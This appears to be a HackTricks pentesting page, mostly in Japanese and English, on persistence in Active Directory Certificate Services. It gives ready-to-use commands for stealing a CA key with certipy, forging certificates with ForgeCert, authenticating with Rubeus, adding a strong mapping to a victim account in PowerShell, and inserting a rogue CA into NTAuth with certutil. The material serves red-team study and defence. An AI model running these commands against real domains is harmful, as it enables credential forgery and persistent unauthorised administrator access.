# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**これは [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) に掲載されている domain persistence techniques の要約です。詳細はそちらを参照してください。**

## Forging Certificates with Stolen CA Certificates - DPERSIST1

How can you tell that a certificate is a CA certificate?

証明書が CA 証明書であるかどうかは、いくつかの条件が満たされている場合に判断できます:

- 証明書は CA サーバー上に格納されており、その秘密鍵はマシンの DPAPI によって保護されているか、OS がサポートしていれば TPM/HSM のようなハードウェアによって保護されている。
- 証明書の Issuer と Subject フィールドの両方が CA の識別名と一致している。
- "CA Version" 拡張は CA 証明書にのみ存在する。
- 証明書には Extended Key Usage (EKU) フィールドがない。

この証明書の秘密鍵を抽出するには、CA サーバー上の `certsrv.msc` ツール（組み込み GUI 経由）がサポートされる方法です。それにもかかわらず、この証明書はシステム内に保存されている他の証明書と異なるものではないため、[THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) のような方法で抽出することも可能です。

証明書と秘密鍵は、Certipy を使用して次のコマンドでも取得できます:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
CA証明書とその秘密鍵を `.pfx` 形式で入手したら、[ForgeCert](https://github.com/GhostPack/ForgeCert) のようなツールを使って有効な証明書を生成できます:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> 証明書偽造の対象となるユーザーは、プロセスを成功させるためにActive Directoryでアクティブかつ認証可能である必要があります。krbtgtのような特殊アカウントに対する証明書偽造は効果がありません。

この偽造証明書は**有効**期限まで、かつ**root CA 証明書が有効である限り**（通常5年から**10年以上**）有効です。これは**マシン**にも有効であり、**S4U2Self**と組み合わせることで、攻撃者はCA証明書が有効な限り**任意のドメインマシン上で永続化を維持**できます.\

さらに、この方法で生成された**証明書**はCAがそれらを認識していないため**取り消すことができません**。

### Strong Certificate Mapping Enforcement (2025+) 下での運用

2025年2月11日以降（KB5014754の展開後）、ドメインコントローラーは証明書マッピングに対してデフォルトで**Full Enforcement**になります。実務上、これは偽造証明書が次のいずれかである必要があることを意味します:

- ターゲットアカウントへの強いバインディングを含む（例えば、SID security extension）、または
- ターゲットオブジェクトの `altSecurityIdentities` 属性に強力で明示的なマッピングを追加して組み合わせる

永続化のための信頼できるアプローチは、盗まれた Enterprise CA にチェーンされた偽造証明書を発行し、その後被害者プリンシパルに強力で明示的なマッピングを追加することです:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Notes
- If you can craft forged certificates that include the SID security extension, those will map implicitly even under Full Enforcement. Otherwise, prefer explicit strong mappings. See
[account-persistence](account-persistence.md) for more on explicit mappings.
- Revocation does not help defenders here: forged certificates are unknown to the CA database and thus cannot be revoked.

## Trusting Rogue CA Certificates - DPERSIST2

The `NTAuthCertificates` object is defined to contain one or more **CA certificates** within its `cacertificate` attribute, which Active Directory (AD) utilizes. The verification process by the **domain controller** involves checking the `NTAuthCertificates` object for an entry matching the **CA specified** in the Issuer field of the authenticating **certificate**. Authentication proceeds if a match is found.

A self-signed CA certificate can be added to the `NTAuthCertificates` object by an attacker, provided they have control over this AD object. Normally, only members of the **Enterprise Admin** group, along with **Domain Admins** or **Administrators** in the **forest root’s domain**, are granted permission to modify this object. They can edit the `NTAuthCertificates` object using `certutil.exe` with the command `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, or by employing the [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Additional helpful commands for this technique:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
This capability is especially relevant when used in conjunction with a previously outlined method involving ForgeCert to dynamically generate certificates.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## 悪意のある設定ミス - DPERSIST3

AD CS コンポーネントのセキュリティ記述子を変更することによる **persistence** の機会は豊富にある。"[Domain Escalation](domain-escalation.md)" セクションで説明された変更は、権限を持つ攻撃者により悪意を持って実行され得る。これには、以下のような機密性の高いコンポーネントに対して「control rights」(例: WriteOwner/WriteDACL/etc.) を追加することが含まれる:

- The **CA server’s AD computer** object
- The **CA server’s RPC/DCOM server**
- Any **descendant AD object or container** in **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (for instance, the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, etc.)
- **AD groups delegated rights to control AD CS** by default or by the organization (such as the built-in Cert Publishers group and any of its members)

悪意ある実装の例としては、ドメイン内で**高い権限**を持つ攻撃者がデフォルトの **`User`** 証明書テンプレートに **`WriteOwner`** 権限を追加し、その権利の主体を攻撃者自身にするケースがある。これを悪用するには、攻撃者はまず **`User`** テンプレートの所有者を自分に変更する。その後、テンプレート上で **`mspki-certificate-name-flag`** を **1** に設定して **`ENROLLEE_SUPPLIES_SUBJECT`** を有効化し、リクエストで Subject Alternative Name を指定できるようにする。続いて攻撃者はその**テンプレート**で**登録**を行い、代替名としてドメイン管理者の名前を選び、取得した証明書を DA としての認証に利用できる。

Practical knobs attackers may set for long-term domain persistence (see {{#ref}}domain-escalation.md{{#endref}} for full details and detection):

- CA policy flags that allow SAN from requesters (e.g., enabling `EDITF_ATTRIBUTESUBJECTALTNAME2`). This keeps ESC1-like paths exploitable.
- Template DACL or settings that allow authentication-capable issuance (e.g., adding Client Authentication EKU, enabling `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controlling the `NTAuthCertificates` object or the CA containers to continuously re-introduce rogue issuers if defenders attempt cleanup.

> [!TIP]
> In hardened environments after KB5014754, pairing these misconfigurations with explicit strong mappings (`altSecurityIdentities`) ensures your issued or forged certificates remain usable even when DCs enforce strong mapping.



## References

- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
{{#include ../../../banners/hacktricks-training.md}}
